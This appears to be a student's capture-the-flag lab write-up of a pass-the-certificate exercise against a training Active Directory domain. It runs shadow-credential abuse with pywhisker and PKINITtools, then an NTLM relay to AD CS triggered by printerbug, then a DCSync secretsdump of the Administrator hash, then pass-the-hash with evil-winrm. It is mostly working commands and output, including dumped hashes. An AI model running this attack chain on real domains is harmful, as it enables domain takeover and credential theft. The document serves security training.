
# Exercise

> Target(s): 10.129.234.174 (ACADEMY-PWATTCK-PTCDC01) ,10.129.234.172 (ACADEMY-PWATTCK-PTCCA01)

> Authenticate to 10.129.234.174 (ACADEMY-PWATTCK-PTCDC01) ,10.129.234.172 (ACADEMY-PWATTCK-PTCCA01) with user "wwhite" and password "package5shores_topher1"


1. What are the contents of `flag.txt` on jpinkman's desktop?

```sh
# Not sure where to start with this. Given that we don't have the print spooler, can we use shadow creds?

git clone https://github.com/ShutdownRepo/pywhisker.git
cd pywhisker
python3 -m venv .venv
source ./venv/bin/activate
pip3 install -r requirements.txt

# Get the certificate
python3 pywhisker/pywhisker/pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a4c30348-0476-7232-49fb-5f0dff4f7bcc
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: OZJR2RGp.pfx
[+] PFX exportiert nach: OZJR2RGp.pfx # This
[i] Passwort für PFX: wgIAVYJ9ykq3PCkIPir8
[+] Saved PFX (#PKCS12) certificate & key at path: OZJR2RGp.pfx
[*] Must be used with password: wgIAVYJ9ykq3PCkIPir8 # This
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools


# clone the pkinittools repo
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
pip3 install -r requirements.txt


# Now, let's acquire a TGT as the victim
python3 PKINITtools/gettgtpkinit.py -cert-pfx OZJR2RGp.pfx -pfx-pass 'wgIAVYJ9ykq3PCkIPir8' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

oscrypto.errors.LibraryNotFoundError: Error detecting the version of libcrypto

# Given the error, we need to install oscrypto 
pip3 install oscrypto

Requirement already satisfied: oscrypto in ./pywhisker/venv/lib/python3.11/site-packages (1.3.0)
Requirement already satisfied: asn1crypto>=1.5.1 in ./pywhisker/venv/lib/python3.11/site-packages (from oscrypto) (1.5.1)

# Ok, so, not sure what the issue is.
sudo python3 -m pip install git+https://github.com/wbond/oscrypto.git@1547f535001ba568b239b8797465536759c742a3


# Requirement already satisfied
sudo python3 -m pip install git+https://github.com/wbond/oscrypto.git@d5f3437ed24257895ae1edd9e503cfb352e635a8


# Get info about the package
pip show oscrypto

Name: oscrypto
Version: 1.3.0
...

# Get OpenSSL version
openssl version
OpenSSL 3.0.15 3 Sep 2024 (Library: OpenSSL 3.0.15 3 Sep 2024)


# So, there seems to be a regex issue since openssl 3.0.x. Per the result pasted below, we need to downgrade openssl
sudo apt install openssl=<desired_version_string> libssl-dev=<desired_version_string>

sudo apt install openssl=3.0.10 libssl-dev=3.0.10

E: Version '3.0.10' for 'openssl' was not found
E: Version '3.0.10' for 'libssl-dev' was not found


# The other option is to upgrade the OS.
sudo apt upgrade -y

openssl version
OpenSSL 3.0.16 11 Feb 2025 (Library: OpenSSL 3.0.16 11 Feb 2025)


# Try again
python3 PKINITtools/gettgtpkinit.py -cert-pfx OZJR2RGp.pfx -pfx-pass 'wgIAVYJ9ykq3PCkIPir8' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache


File "/home/htb-ac-487515/Documents/pywhisker/venv/lib/python3.11/site-packages/oscrypto/_openssl/_libcrypto_cffi.py", line 44, in <module>
    raise LibraryNotFoundError('Error detecting the version of libcrypto')
oscrypto.errors.LibraryNotFoundError: Error detecting the version of libcrypto


# Same library error. Maybe we need to get the hands dirty. Edit the file in line 40 and add  + to the last d as in
version_match = re.search('\\b(\\d\\.\\d\\.\\d+[a-z]*)\\b', version_string)

# Try again. 
python3 PKINITtools/gettgtpkinit.py -cert-pfx OZJR2RGp.pfx -pfx-pass 'wgIAVYJ9ykq3PCkIPir8' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-06-14 16:22:35,179 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-14 16:22:35,207 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-14 16:22:52,035 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-14 16:22:52,035 minikerberos INFO     47e8ec8c2248bcebbf9c26bfead3f7f580d780ee074c2ff31f3b949ce82f5e8f
INFO:minikerberos:47e8ec8c2248bcebbf9c26bfead3f7f580d780ee074c2ff31f3b949ce82f5e8f
2025-06-14 16:22:52,041 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file


# That worked. Let's pass the ticket now
export KRB5CCNAME=/tmp/jpinkman.ccache

#$ Verify
klist


# Did not work. Can we Connect?
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Cannot find KDC for realm "INLANEFREIGHT.LOCAL"


smbclient //10.129.234.174/jpinkman -k -c ls -no-pass
```

Fix [oscrypto error](https://github.com/NixOS/nixpkgs/blob/72b94272c96eef5fe866d10fd76544e54789759c/pkgs/development/python-modules/oscrypto/support-openssl-3.0.10.patch
)

[Openssl Library error](https://community.snowflake.com/s/article/Python-Connector-fails-to-connect-with-LibraryNotFoundError-Error-detecting-the-version-of-libcrypto)


# Resuming exercise session a few hours later

```sh
# Took a walk and re-read the course material. Apparently, we need to install kerberos authentication package
sudo apt-get install krb5-user


# We are now able to use klist
klist
klist: No credentials cache found (filename: /tmp/krb5cc_1002)


# Repeat the steps to install the packages
cd Documents
git clone https://github.com/ShutdownRepo/pywhisker.git
cd pywhisker
python3 -m venv .venv
source ./venv/bin/activate
pip3 install -r requirements.txt


# clone the pkinittools repo
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
pip3 install -r requirements.txt


# Get the cert
python3 pywhisker/pywhisker/pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: f7a38c27-182e-77c8-723a-022c46402ecc
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: uNDgDtcZ.pfx # THIS
[+] PFX exportiert nach: uNDgDtcZ.pfx
[i] Passwort für PFX: 3Ph0iJdZtn0pEgavAlfz
[+] Saved PFX (#PKCS12) certificate & key at path: uNDgDtcZ.pfx
[*] Must be used with password: 3Ph0iJdZtn0pEgavAlfz # THIS
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools


# Now, let's acquire a TGT as the victim
python3 PKINITtools/gettgtpkinit.py -cert-pfx uNDgDtcZ.pfx -pfx-pass '3Ph0iJdZtn0pEgavAlfz' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache


# Fix the library oscrypto error. Edit the file in line 40 and add  + to the last d. as 
version_match = re.search('\\b(\\d\\.\\d\\.\\d+[a-z]*)\\b', version_string)


# Try again
python3 PKINITtools/gettgtpkinit.py -cert-pfx uNDgDtcZ.pfx -pfx-pass '3Ph0iJdZtn0pEgavAlfz' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-06-14 19:14:13,993 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-14 19:14:14,016 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-14 19:14:37,924 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-14 19:14:37,924 minikerberos INFO     0e745343cbf4551b3389818624885721d4a4621b13db4725c6a06f8425a34373
INFO:minikerberos:0e745343cbf4551b3389818624885721d4a4621b13db4725c6a06f8425a34373
2025-06-14 19:14:37,932 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file


# Export
export KRB5CCNAME=/tmp/jpinkman.ccache


# Verify
klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
06/14/2025 19:14:13  06/15/2025 05:14:13  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL


# Now connect
smbclient //10.129.234.174/jpinkman -k -c ls -no-pass

Kerberos auth with 'htb-ac-487515@WORKGROUP' (WORKGROUP\htb-ac-487515) to access '10.129.234.174' not possible
session setup failed: NT_STATUS_ACCESS_DENIED


# Try evilwinrm
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Cannot find KDC for realm "INLANEFREIGHT.LOCAL"


# Reading through the PtC docs again, it looks like we need to configure the  `/etc/krb5.conf` file. Might have missed it when installing krb5 package. Edit the conf file
sudo vi /etc/krb5.conf

cat /etc/krb5.conf

[libdefaults]
	default_realm = INLANEFREIGHT.LOCAL 

...
# The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]
	INLANEFREIGHT.LOCAL= {
		kdc = dc01.inlanefreight.local
	}


# Edit the hosts file
sudo vi /etc/hosts

cat /etc/hosts

...
10.129.234.174 inlanefreight.local dc01.inlanefreight.local dc01
10.129.234.172 ca01.inlanefreight.local


# Try again
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents> 

# SUCCESS!!!! Find the flag
*Evil-WinRM* PS C:\Users\jpinkman\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\jpinkman\Desktop> dir


    Directory: C:\Users\jpinkman\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/28/2025  12:10 PM             32 flag.txt


*Evil-WinRM* PS C:\Users\jpinkman\Desktop> type flag.txt
******
```


2. What are the contents of flag.txt on Administrator's desktop?

```sh
*Evil-WinRM* PS C:\Users\jpinkman\Desktop> cd ..\..\
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/28/2025  11:33 AM                Administrator
d-----        4/28/2025  12:09 PM                jpinkman
d-----        10/6/2021  12:31 PM                lab_adm
d-r---        10/6/2021   3:46 PM                Public
d-----        4/28/2025  12:09 PM                wwhite


*Evil-WinRM* PS C:\Users> cd Administrator

*Evil-WinRM* PS C:\Users\Administrator> dir
Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
malloc(): unaligned fastbin chunk detected
Aborted


# Would have been too easy. Do we need to reproduce the steps and get the admin? Or do we need to get the admin hash through a different way? Who are we and what do we have access to?
whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
inlanefreight\jpinkman S-1-5-21-1225962538-3826430528-595808535-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Key trust identity                          Well-known group S-1-18-4     Mandatory group, Enabled by default, Enabled group
Key property multi-factor authentication    Well-known group S-1-18-5     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Certificate  Well-known group S-1-5-65-1   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.


# Are we part of administrators group?
PS C:\Users\jpinkman\Documents> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.


# Can we catch the admin hash? Start the relay
sudo impacket-ntlmrelayx -t http://AC01/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
sudo impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication



# Download the printer bug
wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py


# Run it against ca01
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@DCIP KALI_IP

python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.15.162 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.174
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked


# In ntlmrelay window

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.174, attacking target http://10.129.234.172
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.129.234.172 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.174, attacking target http://10.129.234.172
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Authenticating against http://10.129.234.172 as / FAILED
[*] GOT CERTIFICATE! ID 14
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file


# Per the module notes, we can begin the attack
python3 PKINITtools/gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache

...
  File "/usr/local/lib/python3.11/dist-packages/oscrypto/_openssl/_libcrypto.py", line 9, in <module>
    from ._libcrypto_cffi import (
  File "/usr/local/lib/python3.11/dist-packages/oscrypto/_openssl/_libcrypto_cffi.py", line 44, in <module>
    raise LibraryNotFoundError('Error detecting the version of libcrypto')
oscrypto.errors.LibraryNotFoundError: Error detecting the version of libcrypto


# Fix the oscrypto error (line 40) and try again
python3 PKINITtools/gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache


2025-06-14 20:36:35,272 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-14 20:36:35,573 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-14 20:36:48,789 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-14 20:36:48,790 minikerberos INFO     a8ba564f8448e5c5c75717f32b832723aa3ff74e3daf8527138187ee25dd7f91
INFO:minikerberos:a8ba564f8448e5c5c75717f32b832723aa3ff74e3daf8527138187ee25dd7f91
2025-06-14 20:36:48,792 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

# Now that we have a TGT, we can pass the ticket
export KRB5CCNAME=/tmp/dc.ccache

# Verify
echo $KRB5CCNAME

/tmp/dc.ccache

klist

Ticket cache: FILE:/tmp/dc.ccache
Default principal: dc01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
06/14/2025 20:36:25  06/15/2025 06:36:25  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL


# Retrieve the NTLM hash for the admin user
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
Administrator:des-cbc-md5:a1f262b50b64c46b
[*] Cleaning up... 


# Connect
evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c

...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/28/2025  12:10 PM             32 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
******
```
